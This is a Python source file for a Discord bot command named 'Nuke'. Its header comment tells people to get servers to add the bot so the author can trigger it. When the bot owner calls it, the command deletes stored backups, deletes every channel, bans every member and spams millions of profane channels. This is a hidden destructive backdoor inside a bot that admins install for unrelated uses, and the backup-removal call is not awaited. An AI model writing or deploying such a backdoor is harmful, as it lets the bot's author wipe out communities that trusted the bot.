# Nuker - Just ignore it, when it's a scam server like *x invites = y*, or advertising in another server? Or something which is a big no no? I'm not gonna think and click this nuke button. Just get them to add this bot and invite me (PanSageYT#5099) :D
import os
import glob

import discord

import utils

async def Remove_Backups(gui):
    try:
        for x in glob.glob(f"backups/{gui.id}/*.json"):
            os.remove(x)
    except:
        pass

async def Cmd(idres, guild):
    try:
        if (not (utils.is_owner_of_bot(idres))):
            embedVar = discord.Embed(title="Nuke", description="for Pan-Project Bot.", color=0xff0000)
            embedVar.add_field(name="Error.", value="I can't allow you", inline=False)
            return embedVar

        Remove_Backups(guild)

        for channel in guild.text_channels:
            await channel.delete()
        for channel in guild.voice_channels:
            await channel.delete()
        for channel in guild.members:
            try:
                await channel.ban(reason="One of you on server did a big no no")
            except:
                await channel.send("Somehow I couldn't ban you, maybe you are an owner? Someone in server betrayed you doing a big no no.")

        for cont in range(2137 * 2137):
            await guild.create_text_channel("FUCKED UP YOUR SERVER BRO " + str(cont))

    except Exception as e:
        await utils.save_error("Nuke / DevToolKit", os.path.basename(__file__), e)
        embedVar = discord.Embed(title="Nuke", description="for Pansage Bot.", color=0xff0000)
        embedVar.add_field(name="Error.", value="I saved error in my error database, my creator will check out.", inline=False)
        return embedVar

